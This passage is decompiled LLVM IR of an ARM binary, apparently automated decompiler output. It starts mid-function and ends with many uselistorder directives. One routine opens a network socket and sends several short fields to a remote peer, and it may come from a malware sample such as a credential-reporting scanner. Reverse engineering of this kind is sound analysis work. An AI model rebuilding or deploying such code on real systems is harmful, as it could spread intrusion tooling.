  store i32 %v2_e668, i32* %r3.global-to-local, align 4
  store i32 %v2_f7e8, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_fa6c = call i32 @function_1144c(i32 %v3_eeec, i32 1, i32 4, i32 %v2_e668, i32 %v2_f7e8)
  %v3_fa70 = load i8, i8* %stack_var_-56, align 1
  %v4_fa70 = sext i8 %v3_fa70 to i32
  store i32 %v4_fa70, i32* %r3.global-to-local, align 4
  %v2_fa74 = or i32 %v4_fa70, %v5_fa6c
  store i32 %v2_fa74, i32* %r0.global-to-local, align 4
  %v4_fa74 = icmp eq i32 %v2_fa74, 0
  store i1 %v4_fa74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fa74, label %dec_label_pc_fa7c, label %dec_label_pc_fb28

dec_label_pc_fa7c:                                ; preds = %dec_label_pc_fa44
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_fa80 = load i32, i32* @r6, align 4
  %v2_fa80 = add i32 %v1_fa80, 12
  %v3_fa80 = inttoptr i32 %v2_fa80 to i32*
  store i32 2, i32* %v3_fa80, align 4
  %v0_fa84 = call i32 @function_e0b8()
  store i32 %v0_fa84, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_1ea24.127 to i32), i32* %r3.global-to-local, align 4
  %v2_fa8c = load i16, i16* bitcast (i16** @global_var_1ea24.127 to i16*), align 4
  %v3_fa8c = zext i16 %v2_fa8c to i32
  store i32 %v3_fa8c, i32* %r1.global-to-local, align 4
  %v3_fa90 = call i32 @function_10974(i32 %v0_fa84, i32 %v3_fa8c)
  store i32 %v3_fa90, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9f4.123 to i32), i32* %r3.global-to-local, align 4
  %v2_fa98 = load i32, i32* @global_var_1e9f4.123, align 4
  store i32 %v2_fa98, i32* %ip.global-to-local, align 4
  %v1_faa0 = load i32, i32* @r4, align 4
  %v9_faa0 = icmp eq i32 %v2_fa98, %v1_faa0
  store i1 %v9_faa0, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_fa8c, i32* %r1.global-to-local, align 4
  %v7_faa8 = icmp sgt i32 %v2_fa98, %v1_faa0
  br i1 %v7_faa8, label %dec_label_pc_faac, label %dec_label_pc_faec

dec_label_pc_faac:                                ; preds = %dec_label_pc_fa7c
  %v2_fab0 = load i32, i32* @global_var_1ea20.125, align 4
  store i32 %v2_fab0, i32* %r3.global-to-local, align 4
  store i32 %v1_faa0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_facc

dec_label_pc_fabc:                                ; preds = %dec_label_pc_fadc, %dec_label_pc_facc
  %v1_fabc = add i32 %v0_fabc, 1
  store i32 %v1_fabc, i32* %r2.global-to-local, align 4
  %v9_fac0 = icmp eq i32 %v1_fabc, %v2_fa98
  %v1_fac4 = add i32 %v0_fac4, 16
  store i32 %v1_fac4, i32* %r3.global-to-local, align 4
  br i1 %v9_fac0, label %dec_label_pc_faec.loopexit, label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_fabc, %dec_label_pc_faac
  %v0_fabc = phi i32 [ %v1_fabc, %dec_label_pc_fabc ], [ %v1_faa0, %dec_label_pc_faac ]
  %v0_fac4 = phi i32 [ %v1_fac4, %dec_label_pc_fabc ], [ %v2_fab0, %dec_label_pc_faac ]
  store i32 %v0_fac4, i32* %r0.global-to-local, align 4
  %v1_fad0 = add i32 %v0_fac4, 8
  %v2_fad0 = inttoptr i32 %v1_fad0 to i16*
  %v3_fad0 = load i16, i16* %v2_fad0, align 2
  %v4_fad0 = zext i16 %v3_fad0 to i32
  store i32 %v4_fad0, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i16 %v3_fad0, %v2_fa8c
  br i1 %tmp460, label %dec_label_pc_fabc, label %dec_label_pc_fadc

dec_label_pc_fadc:                                ; preds = %dec_label_pc_facc
  %v1_fadc = add i32 %v0_fac4, 10
  %v2_fadc = inttoptr i32 %v1_fadc to i16*
  %v3_fadc = load i16, i16* %v2_fadc, align 2
  %v4_fadc = zext i16 %v3_fadc to i32
  store i32 %v4_fadc, i32* %r3.global-to-local, align 4
  %v3_fae0 = icmp uge i16 %v3_fadc, %v2_fa8c
  %v9_fae0 = icmp eq i16 %v3_fadc, %v2_fa8c
  %v2_fae4 = xor i1 %v3_fae0, true
  %v3_fae4 = or i1 %v9_fae0, %v2_fae4
  br i1 %v3_fae4, label %dec_label_pc_fabc, label %dec_label_pc_faf0.loopexit

dec_label_pc_faec.loopexit:                       ; preds = %dec_label_pc_fabc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_faec

dec_label_pc_faec:                                ; preds = %dec_label_pc_faec.loopexit, %dec_label_pc_fa7c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_faf0

dec_label_pc_faf0.loopexit:                       ; preds = %dec_label_pc_fadc
  store i1 %v3_fae0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_faf0

dec_label_pc_faf0:                                ; preds = %dec_label_pc_faf0.loopexit, %dec_label_pc_faec
  %v0_fb04 = phi i32 [ %v0_fac4, %dec_label_pc_faf0.loopexit ], [ 0, %dec_label_pc_faec ]
  %v0_faf0 = load i32, i32* @r6, align 4
  %v1_faf0 = add i32 %v0_faf0, 4
  %v2_faf0 = inttoptr i32 %v1_faf0 to i32*
  %v3_faf0 = load i32, i32* %v2_faf0, align 4
  %v3_faf4 = udiv i32 %v3_faf0, 32
  store i32 %v3_faf4, i32* %r2.global-to-local, align 4
  %v1_faf8 = urem i32 %v3_faf0, 32
  store i32 %v1_faf8, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_fafc = mul nuw nsw i32 %v3_faf4, 4
  store i32 %v3_fafc, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fb04 = inttoptr i32 %v0_faf0 to i32*
  store i32 %v0_fb04, i32* %v2_fb04, align 4
  %v0_fb08 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb08 = load i32, i32* @r6, align 4
  %v2_fb08 = add i32 %v1_fb08, 24
  %v3_fb08 = inttoptr i32 %v2_fb08 to i32*
  store i32 %v0_fb08, i32* %v3_fb08, align 4
  %v0_ef20.pre = load i32, i32* @ip, align 4
  %v1_ef28.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ef1c

dec_label_pc_fb10:                                ; preds = %dec_label_pc_f834
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_fb14 = call i32 @function_fcc4(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_fb1c = call i32 @function_fcc4(i32 30)
  store i32 %v1_fb1c, i32* %r0.global-to-local, align 4
  %v0_fb20 = load i32, i32* @r6, align 4
  %v1_fb20 = add i32 %v0_fb20, 12
  %v2_fb20 = inttoptr i32 %v1_fb20 to i32*
  %v3_fb20 = load i32, i32* %v2_fb20, align 4
  store i32 %v3_fb20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef38.backedge

dec_label_pc_fb28:                                ; preds = %dec_label_pc_fa44
  %v0_fb28 = load i32, i32* @r6, align 4
  %v1_fb28 = add i32 %v0_fb28, 4
  %v2_fb28 = inttoptr i32 %v1_fb28 to i32*
  %v3_fb28 = load i32, i32* %v2_fb28, align 4
  store i32 %v3_fb28, i32* %r0.global-to-local, align 4
  %v1_fb2c = call i32 @function_10ddc(i32 %v3_fb28)
  store i32 %v1_fb2c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_fb34 = load i32, i32* @r4, align 4
  %v1_fb34 = load i32, i32* @r6, align 4
  %v2_fb34 = add i32 %v1_fb34, 12
  %v3_fb34 = inttoptr i32 %v2_fb34 to i32*
  store i32 %v0_fb34, i32* %v3_fb34, align 4
  %v0_fb38 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb38 = load i32, i32* @r6, align 4
  %v2_fb38 = add i32 %v1_fb38, 4
  %v3_fb38 = inttoptr i32 %v2_fb38 to i32*
  store i32 %v0_fb38, i32* %v3_fb38, align 4
  %v0_fb3c = load i32, i32* @r4, align 4
  %v1_fb3c = trunc i32 %v0_fb3c to i8
  %v2_fb3c = load i32, i32* @r6, align 4
  %v3_fb3c = add i32 %v2_fb3c, 284
  %v4_fb3c = inttoptr i32 %v3_fb3c to i8*
  store i8 %v1_fb3c, i8* %v4_fb3c, align 1
  br label %dec_label_pc_f03c

dec_label_pc_fb44:                                ; preds = %dec_label_pc_efec
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_fb48 = load i32, i32* %fp.global-to-local, align 4
  %v2_fb48 = inttoptr i32 %v1_fb48 to i32*
  store i32 104, i32* %v2_fb48, align 4
  br label %dec_label_pc_f004

dec_label_pc_fb50:                                ; preds = %thread-pre-split124
  store i32 %v1_fb54, i32* %r0.global-to-local, align 4
  %v0_fb58 = load i32, i32* @r6, align 4
  %v1_fb58 = add i32 %v0_fb58, 12
  %v2_fb58 = inttoptr i32 %v1_fb58 to i32*
  %v3_fb58 = load i32, i32* %v2_fb58, align 4
  store i32 %v3_fb58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef38.backedge

dec_label_pc_ef38.backedge.thread:                ; preds = %dec_label_pc_f0f8, %dec_label_pc_f1cc, %dec_label_pc_f370, %dec_label_pc_f444, %dec_label_pc_f590
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef40

dec_label_pc_ef38.backedge.thread561:             ; preds = %dec_label_pc_f4a8, %dec_label_pc_f3d4, %dec_label_pc_f5f4, %dec_label_pc_f230, %dec_label_pc_f15c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef40

dec_label_pc_ef38.backedge:                       ; preds = %dec_label_pc_efb4, %dec_label_pc_fb50, %dec_label_pc_fb10
  %v0_ef40228 = phi i32 [ %v0_fb20, %dec_label_pc_fb10 ], [ %v0_fb58, %dec_label_pc_fb50 ], [ %v0_efb4, %dec_label_pc_efb4 ]
  %v0_ef38.be = phi i32 [ %v3_fb20, %dec_label_pc_fb10 ], [ %v3_fb58, %dec_label_pc_fb50 ], [ %v3_efb4, %dec_label_pc_efb4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef38 = icmp eq i32 %v0_ef38.be, 0
  store i1 %v2_ef38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef38, label %dec_label_pc_f03c, label %dec_label_pc_ef40

dec_label_pc_fb60:                                ; preds = %bb459
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_fb6c = call i32 @function_115f4(i32 2, i32 1, i32 0)
  store i32 %v3_fb6c, i32* %r0.global-to-local, align 4
  %v2_fb70 = icmp eq i32 %v3_fb6c, -1
  store i1 %v2_fb70, i1* %cpsr_c.global-to-local, align 1
  %v7_fb70 = icmp eq i32 %v3_fb6c, -1
  store i1 %v7_fb70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_fb6c, i32* @r4, align 4
  br i1 %v7_fb70, label %dec_label_pc_fbf4, label %dec_label_pc_fb7c

dec_label_pc_fb7c:                                ; preds = %dec_label_pc_fb60
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fb80 = call i32 @function_fd64(i32 4)
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_16180.75 to i32), i32* @r0, align 4
  %v2_fb94 = call i32 @function_11344(i32 ptrtoint ([15 x i8]* @global_var_16180.75 to i32))
  %v0_fb98 = load i32, i32* @r5, align 4
  store i32 %v0_fb98, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_fba4 = inttoptr i32 %v0_fb98 to i32*
  %v3_fba4 = call i32 @function_fca0(i32 4, i32* %v2_fba4)
  store i32 %v2_f9a4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_fbb8 = call i32 @function_fcc4(i32 4)
  %v0_fbc0 = load i32, i32* @r4, align 4
  store i32 %v0_fbc0, i32* %r0.global-to-local, align 4
  store i32 %v2_e874, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fbcc = call i32 @function_113dc(i32 %v0_fbc0, i32 %v2_e874, i32 16)
  store i32 %v3_fbcc, i32* %r0.global-to-local, align 4
  %v3_fbd0 = icmp eq i32 %v3_fbcc, -1
  store i1 %v3_fbd0, i1* %cpsr_c.global-to-local, align 1
  %v8_fbd0 = icmp eq i32 %v3_fbcc, -1
  store i1 %v8_fbd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fbd0, label %dec_label_pc_fbd8, label %dec_label_pc_fbfc

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fb7c
  %v0_fbd8 = load i32, i32* @r4, align 4
  store i32 %v0_fbd8, i32* %r0.global-to-local, align 4
  %v1_fbdc = call i32 @function_10ddc(i32 %v0_fbd8)
  %v0_fbe0 = load i32, i32* @r5, align 4
  store i32 %v0_fbe0, i32* %r0.global-to-local, align 4
  %v1_fbe4 = call i32 @function_12e48(i32 %v0_fbe0)
  store i32 %v1_fbe4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fbe8

dec_label_pc_fbe8:                                ; preds = %dec_label_pc_e644, %dec_label_pc_fbd8
  store i32 ptrtoint (i32* @global_var_20a7c.135 to i32), i32* %ip.global-to-local, align 4
  %v2_fbec = load i32, i32* @global_var_20a7c.135, align 4
  store i32 %v2_fbec, i32* %r0.global-to-local, align 4
  %v1_fbf0 = call i32 @function_10ddc(i32 %v2_fbec)
  store i32 %v1_fbf0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fbf4

dec_label_pc_fbf4:                                ; preds = %dec_label_pc_e620.dec_label_pc_fbf4_crit_edge, %dec_label_pc_fb60, %dec_label_pc_fbfc, %dec_label_pc_fbe8
  %.pre.pre-phi = phi i32 [ %.pre283, %dec_label_pc_e620.dec_label_pc_fbf4_crit_edge ], [ %v2_e668, %dec_label_pc_fb60 ], [ %v2_fbfc.pre-phi, %dec_label_pc_fbfc ], [ %v2_e668, %dec_label_pc_fbe8 ]
  %v0_fbf4 = load i32, i32* @r5, align 4
  store i32 %v0_fbf4, i32* %r0.global-to-local, align 4
  %v1_fbf8 = call i32 @function_12e48(i32 %v0_fbf4)
  store i32 %v1_fbf8, i32* %r0.global-to-local, align 4
  %.pre281 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_fbfc

dec_label_pc_fbfc:                                ; preds = %dec_label_pc_fb7c, %dec_label_pc_fbf4
  %v2_fc1c.pre-phi = phi i32 [ %v2_f7e8, %dec_label_pc_fb7c ], [ %.pre281, %dec_label_pc_fbf4 ]
  %v2_fbfc.pre-phi = phi i32 [ %v2_e668, %dec_label_pc_fb7c ], [ %.pre.pre-phi, %dec_label_pc_fbf4 ]
  store i32 %v2_fbfc.pre-phi, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc08 = load i32, i32* @r4, align 4
  store i32 %v0_fc08, i32* %r0.global-to-local, align 4
  %v0_fc0c = load i32, i32* @r5, align 4
  %v6_fc0c = trunc i32 %v0_fc0c to i8
  store i8 %v6_fc0c, i8* %stack_var_-56, align 1
  %v6_fc10 = call i32 @function_11538(i32 %v0_fc08, i32 %v2_fbfc.pre-phi, i32 1, i32 16384)
  %v0_fc18 = load i32, i32* @r4, align 4
  store i32 %v0_fc18, i32* %r0.global-to-local, align 4
  store i32 %v2_fc1c.pre-phi, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc28 = call i32 @function_11538(i32 %v0_fc18, i32 %v2_fc1c.pre-phi, i32 4, i32 16384)
  %v0_fc30 = load i32, i32* @r4, align 4
  store i32 %v0_fc30, i32* %r0.global-to-local, align 4
  %v2_fc34 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_fc34, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc40 = call i32 @function_11538(i32 %v0_fc30, i32 %v2_fc34, i32 2, i32 16384)
  %v0_fc44 = load i32, i32* @r8, align 4
  %v1_fc44 = add i32 %v0_fc44, 12
  store i32 %v1_fc44, i32* %r1.global-to-local, align 4
  %v0_fc48 = load i32, i32* @r4, align 4
  store i32 %v0_fc48, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc54 = call i32 @function_11538(i32 %v0_fc48, i32 %v1_fc44, i32 1, i32 16384)
  store i32 %v4_fc54, i32* %r0.global-to-local, align 4
  %v0_fc58 = load i32, i32* @r8, align 4
  %v1_fc58 = inttoptr i32 %v0_fc58 to i32*
  %v2_fc58 = load i32, i32* %v1_fc58, align 4
  store i32 %v2_fc58, i32* %r1.global-to-local, align 4
  %v1_fc5c = add i32 %v0_fc58, 12
  %v2_fc5c = inttoptr i32 %v1_fc5c to i8*
  %v3_fc5c = load i8, i8* %v2_fc5c, align 1
  %v4_fc5c = zext i8 %v3_fc5c to i32
  store i32 %v4_fc5c, i32* %r2.global-to-local, align 4
  %v0_fc60 = load i32, i32* @r4, align 4
  store i32 %v0_fc60, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc68 = call i32 @function_11538(i32 %v0_fc60, i32 %v2_fc58, i32 %v4_fc5c, i32 16384)
  %v0_fc6c = load i32, i32* @r8, align 4
  %v1_fc6c = add i32 %v0_fc6c, 13
  store i32 %v1_fc6c, i32* %r1.global-to-local, align 4
  %v0_fc70 = load i32, i32* @r4, align 4
  store i32 %v0_fc70, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc7c = call i32 @function_11538(i32 %v0_fc70, i32 %v1_fc6c, i32 1, i32 16384)
  %v0_fc80 = load i32, i32* @r4, align 4
  store i32 %v0_fc80, i32* %r0.global-to-local, align 4
  %v0_fc84 = load i32, i32* @r8, align 4
  %v1_fc84 = add i32 %v0_fc84, 13
  %v2_fc84 = inttoptr i32 %v1_fc84 to i8*
  %v3_fc84 = load i8, i8* %v2_fc84, align 1
  %v4_fc84 = zext i8 %v3_fc84 to i32
  store i32 %v4_fc84, i32* %r2.global-to-local, align 4
  %v1_fc88 = add i32 %v0_fc84, 4
  %v2_fc88 = inttoptr i32 %v1_fc88 to i32*
  %v3_fc88 = load i32, i32* %v2_fc88, align 4
  store i32 %v3_fc88, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc90 = call i32 @function_11538(i32 %v0_fc80, i32 %v3_fc88, i32 %v4_fc84, i32 16384)
  %v0_fc94 = load i32, i32* @r4, align 4
  store i32 %v0_fc94, i32* %r0.global-to-local, align 4
  %v1_fc98 = call i32 @function_10ddc(i32 %v0_fc94)
  store i32 %v1_fc98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fbf4

; uselistorder directives
  uselistorder i32 %v2_fbfc.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v2_fc1c.pre-phi, { 1, 0 }
  uselistorder i1 %v7_fb70, { 1, 0 }
  uselistorder i32 %v3_fb6c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_faf0, { 1, 0 }
  uselistorder i1 %v3_fae0, { 1, 0 }
  uselistorder i32 %v0_fac4, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_fa98, { 0, 2, 1, 3 }
  uselistorder i32 %v3_fa04, { 1, 0 }
  uselistorder i1 %v2_f9d0, { 1, 0 }
  uselistorder i32 %.465, { 1, 0 }
  uselistorder i1 %v7_f9b8, { 1, 0 }
  uselistorder i32 %v0_f9b4, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f98c, { 1, 0 }
  uselistorder i32 %v0_f98c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f8dc.pr, { 1, 0 }
  uselistorder i32 %v0_f8a8, { 1, 2, 0 }
  uselistorder i32 %v4_f848, { 1, 0, 2 }
  uselistorder i1 %v7_f824, { 1, 0 }
  uselistorder i32 %v1_f7cc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f7cc, { 0, 2, 1 }
  uselistorder i32 %v0_f7c4, { 1, 0 }
  uselistorder i1 %v7_f7c0, { 1, 0 }
  uselistorder i1 %v7_f7b8, { 1, 0 }
  uselistorder i1 %v7_f7b0, { 1, 0 }
  uselistorder i1 %v8_f7a8, { 1, 0 }
  uselistorder i1 %v7_f78c, { 1, 0 }
  uselistorder i1 %v7_f784, { 1, 0 }
  uselistorder i1 %v7_f77c, { 1, 0 }
  uselistorder i1 %v8_f774, { 1, 0 }
  uselistorder i32 %v1_f75c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v0_f708, { 1, 0 }
  uselistorder i32 %v4_f6fc, { 1, 0, 2 }
  uselistorder i32 %v1_f6c8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f6c8, { 0, 2, 1 }
  uselistorder i32 %v0_f6c0, { 1, 0 }
  uselistorder i1 %v7_f6bc, { 1, 0 }
  uselistorder i1 %v7_f6b4, { 1, 0 }
  uselistorder i1 %v8_f6ac, { 1, 0 }
  uselistorder i1 %v7_f690, { 1, 0 }
  uselistorder i1 %v7_f688, { 1, 0 }
  uselistorder i1 %v8_f680, { 1, 0 }
  uselistorder i32 %v1_f668, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_f604, { 1, 0 }
  uselistorder i8 %v3_f5fc, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f5f4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f5f4, { 0, 2, 1 }
  uselistorder i32 %v0_f5ec, { 1, 0 }
  uselistorder i1 %v7_f5e8, { 1, 0 }
  uselistorder i1 %v7_f5e0, { 1, 0 }
  uselistorder i1 %v7_f5d8, { 1, 0 }
  uselistorder i1 %v7_f5c4, { 1, 0 }
  uselistorder i1 %v7_f5bc, { 1, 0 }
  uselistorder i1 %v7_f5b4, { 1, 0 }
  uselistorder i1 %v8_f5ac, { 1, 0 }
  uselistorder i32 %v1_f594, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f4b8, { 1, 0 }
  uselistorder i8 %v3_f4b0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f4a8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f4a8, { 0, 2, 1 }
  uselistorder i32 %v0_f4a0, { 1, 0 }
  uselistorder i1 %v7_f49c, { 1, 0 }
  uselistorder i1 %v7_f494, { 1, 0 }
  uselistorder i1 %v7_f48c, { 1, 0 }
  uselistorder i1 %v7_f478, { 1, 0 }
  uselistorder i1 %v7_f470, { 1, 0 }
  uselistorder i1 %v7_f468, { 1, 0 }
  uselistorder i1 %v8_f460, { 1, 0 }
  uselistorder i32 %v1_f448, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f3e4, { 1, 0 }
  uselistorder i8 %v3_f3dc, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f3d4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f3d4, { 0, 2, 1 }
  uselistorder i32 %v0_f3cc, { 1, 0 }
  uselistorder i1 %v7_f3c8, { 1, 0 }
  uselistorder i1 %v7_f3c0, { 1, 0 }
  uselistorder i1 %v7_f3b8, { 1, 0 }
  uselistorder i1 %v7_f3a4, { 1, 0 }
  uselistorder i1 %v7_f39c, { 1, 0 }
  uselistorder i1 %v7_f394, { 1, 0 }
  uselistorder i1 %v8_f38c, { 1, 0 }
  uselistorder i32 %v1_f374, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f360, { 1, 0 }
  uselistorder i32 %v1_f358, { 1, 0 }
  uselistorder i32 %v1_f350, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_f34c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f34c, { 0, 2, 1 }
  uselistorder i32 %v0_f32c.pr, { 1, 0 }
  uselistorder i32 %v0_f30c.pr, { 1, 0 }
  uselistorder i1 %v7_f2e4, { 1, 0 }
  uselistorder i1 %v2_f2d4, { 1, 0, 2 }
  uselistorder i1 %v2_f2b8, { 1, 0, 2 }
  uselistorder i32 %v1_f2d8, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f2ac, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_f2dc, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f240, { 1, 0 }
  uselistorder i8 %v3_f238, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f230, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f230, { 0, 2, 1 }
  uselistorder i32 %v0_f228, { 1, 0 }
  uselistorder i1 %v7_f224, { 1, 0 }
  uselistorder i1 %v7_f21c, { 1, 0 }
  uselistorder i1 %v7_f214, { 1, 0 }
  uselistorder i1 %v7_f200, { 1, 0 }
  uselistorder i1 %v7_f1f8, { 1, 0 }
  uselistorder i1 %v7_f1f0, { 1, 0 }
  uselistorder i1 %v8_f1e8, { 1, 0 }
  uselistorder i32 %v1_f1d0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f16c, { 1, 0 }
  uselistorder i8 %v3_f164, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f15c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f15c, { 0, 2, 1 }
  uselistorder i32 %v0_f154, { 1, 0 }
  uselistorder i1 %v7_f150, { 1, 0 }
  uselistorder i1 %v7_f148, { 1, 0 }
  uselistorder i1 %v7_f140, { 1, 0 }
  uselistorder i1 %v7_f12c, { 1, 0 }
  uselistorder i1 %v7_f124, { 1, 0 }
  uselistorder i1 %v7_f11c, { 1, 0 }
  uselistorder i1 %v8_f114, { 1, 0 }
  uselistorder i32 %v1_f0fc, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f0e8, { 1, 2, 0 }
  uselistorder i32 %v2_f0d4, { 1, 0 }
  uselistorder i32 %v0_f0d4, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f0d0, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_f0a8, { 2, 1, 0 }
  uselistorder i1 %v7_f084, { 1, 0 }
  uselistorder i32 %v4_f080, { 1, 0, 2 }
  uselistorder i32 %v1_f040, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f024, { 1, 0 }
  uselistorder i32 %v1_f014, { 2, 1, 0 }
  uselistorder i32 %v1_f010, { 1, 0 }
  uselistorder i32 %v0_efb4, { 2, 5, 6, 20, 7, 8, 21, 9, 10, 24, 11, 12, 22, 13, 14, 23, 4, 3, 19, 15, 16, 25, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_ef90, { 1, 2, 3, 0 }
  uselistorder i32 %v3_ef8c, { 1, 0 }
  uselistorder i32 %v4_ef70, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_ef5c, { 1, 0, 2 }
  uselistorder i32 %v3_ef58, { 1, 0, 2 }
  uselistorder i32 %v0_fa14, { 1, 0, 2 }
  uselistorder i32 %v3_ef24, { 1, 0 }
  uselistorder i32 %v1_ef0c, { 3, 2, 1, 0 }
  uselistorder i32 %v3_ef08, { 1, 0 }
  uselistorder i32 %v3_ef00, { 1, 2, 0 }
  uselistorder i1 %v7_eef0, { 1, 0 }
  uselistorder i32 %v3_eeec, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_eee0, { 1, 0 }
  uselistorder i32 %v1_ee88, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ee88, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ee6c, { 0, 2, 1 }
  uselistorder i32 %v1_ee64, { 1, 0 }
  uselistorder i32 %v1_ee24, { 2, 1, 0 }
  uselistorder i32 %v1_ee20, { 1, 0 }
  uselistorder i1 %v2_ee00, { 1, 0, 2 }
  uselistorder i32 %v0_edfc, { 1, 0, 2 }
  uselistorder i1 %v7_edc8, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_edc8, { 1, 0, 2 }
  uselistorder i32 %v2_edc0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_edb4, { 1, 0, 2 }
  uselistorder i32 %v0_edb8, { 1, 0 }
  uselistorder i32 %v1_ed9c, { 1, 2, 0, 3, 4, 5 }
